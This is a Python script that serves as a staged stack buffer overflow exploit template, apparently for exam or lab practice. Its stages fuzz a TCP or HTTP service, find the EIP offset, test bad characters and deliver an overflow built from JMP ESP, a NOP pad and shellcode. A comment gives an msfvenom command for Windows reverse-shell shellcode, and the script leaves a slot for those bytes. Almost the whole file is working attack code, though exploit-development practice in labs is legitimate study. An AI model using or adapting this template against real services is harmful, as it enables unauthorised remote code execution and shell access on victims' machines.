#!/usr/bin/env python3
"""
stack_bof.py — Classic stack buffer overflow template (EIP overwrite -> JMP ESP).

WORKFLOW (uncomment one STAGE at a time as you progress):
  STAGE 1  fuzz        -> find crashing length
  STAGE 2  pattern     -> send cyclic, read EIP, get offset
  STAGE 3  control     -> BBBB into EIP to confirm
  STAGE 4  badchars    -> send test array, mona compare
  STAGE 5  exploit     -> JMP ESP + NOPs + shellcode

Fill in the CONFIG block, then walk the stages. Companion playbook:
  00-methodology/stack-bof-playbook.md
"""
import struct

# ── CONFIG ────────────────────────────────────────────────────────────────────
RHOST      = "127.0.0.1"
RPORT      = 9999
CRASH_LEN  = 3000                 # length that reliably crashes (from STAGE 1)
OFFSET     = 0                    # bytes to EIP (fill from STAGE 2, e.g. 2003)
JMP_ESP    = 0x625011af           # JMP ESP addr, badchar-clean, non-ASLR (STAGE 5)
BADCHARS   = b"\x00\x0a\x0d"      # confirmed bad chars (STAGE 4)
PROTO      = "tcp"               # "tcp" | "http"
RECV_FIRST = False               # True if the service sends a banner first
# ────────────────────────────────────────────────────────────────────────────────

def p32(a): return struct.pack("<I", a)

# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f python -v shellcode \
#          -b "\x00\x0a\x0d" EXITFUNC=thread
shellcode = b""
shellcode += b"\x90" * 16        # NOP landing pad
shellcode += b""                 # <-- paste msfvenom bytes here


def stage1_fuzz():
    """Send growing buffers until it dies. Note the length; set CRASH_LEN."""
    import time
    from send_helpers import send_tcp
    size = 500
    while size < 6000:
        buf = b"A" * size
        print(f"[*] fuzzing with {size} bytes")
        try:
            send_tcp(RHOST, RPORT, buf, recv_first=RECV_FIRST, timeout=3)
        except Exception as e:
            print(f"[!] connection failed at {size} bytes -> likely crash: {e}")
            break
        size += 500
        time.sleep(1)


def stage2_pattern():
    """Send a cyclic pattern; read EIP in WinDbg; then run:
       msf-pattern_offset -l CRASH_LEN -q <EIP value>   (or mona findmsp)."""
    from send_helpers import cyclic
    return b"A"  # placeholder — actually build below
    # buf = cyclic(CRASH_LEN)  ; deliver(buf)


def stage3_control():
    """Confirm EIP control: BBBB should land in EIP."""
    buf  = b"A" * OFFSET
    buf += b"BBBB"                        # EIP -> 42424242
    buf += b"C" * (CRASH_LEN - len(buf))
    return buf


def stage4_badchars():
    """Send \\x01..\\xff (minus known-bad) after EIP; mona compare at ESP."""
    from send_helpers import badchar_array
    arr = badchar_array(BADCHARS)
    buf  = b"A" * OFFSET
    buf += b"BBBB"
    buf += arr
    buf += b"C" * max(0, CRASH_LEN - len(buf))
    return buf


def stage5_exploit():
    """Full exploit: offset + JMP ESP + shellcode (with NOP pad)."""
    buf  = b"A" * OFFSET
    buf += p32(JMP_ESP)
    buf += shellcode
    buf += b"C" * max(0, CRASH_LEN - len(buf))
    return buf


def deliver(buf: bytes):
    from send_helpers import send_tcp, send_http
    if PROTO == "http":
        send_http(RHOST, RPORT, "/", buf)
    else:
        send_tcp(RHOST, RPORT, buf, recv_first=RECV_FIRST)


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")
    stage = sys.argv[1] if len(sys.argv) > 1 else "5"
    if stage == "1":
        stage1_fuzz()
    else:
        buf = {"2": lambda: __import__("send_helpers").cyclic(CRASH_LEN),
               "3": stage3_control,
               "4": stage4_badchars,
               "5": stage5_exploit}[stage]()
        deliver(buf)
    print("[+] done")
